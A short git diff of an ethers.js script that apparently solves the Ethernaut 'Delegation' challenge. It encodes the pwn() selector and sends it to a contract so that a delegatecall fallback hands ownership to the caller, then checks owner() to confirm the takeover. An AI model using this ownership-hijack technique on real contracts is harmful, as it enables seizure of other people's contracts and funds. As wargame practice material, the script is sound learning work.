@@ -19,12 +19,11 @@ async function main() {
   );
   console.log("...");
   console.log(await delegation.owner());
-  //   I wrote a code on Remix:
-  // function getsig () public pure returns (bytes memory) {
-  // return abi.encodeWithSignature("pwn()");
-  // }
-  //   the code returned "0xdd365b8b"
-  // Can I do it with ether.js?
+
+  let ABI = ["function pwn()"];
+  let iface = new ethers.utils.Interface(ABI);
+  let encoded = iface.encodeFunctionData("pwn", []);
+  console.log(encoded);
 
   const transaction = await signer.sendTransaction({
     to: "0x58f60F03a855111b1Df15bE3E411f1E53322F125",
@@ -35,7 +34,7 @@ async function main() {
   // await web3.utils.sha3("pwn()")
   // await contract.sendTransaction({ data: "0xdd365b8b" })
   await transaction.wait(1);
-  console.log(transaction);
+  // console.log(transaction);
   console.log(await delegation.owner());
 }
 
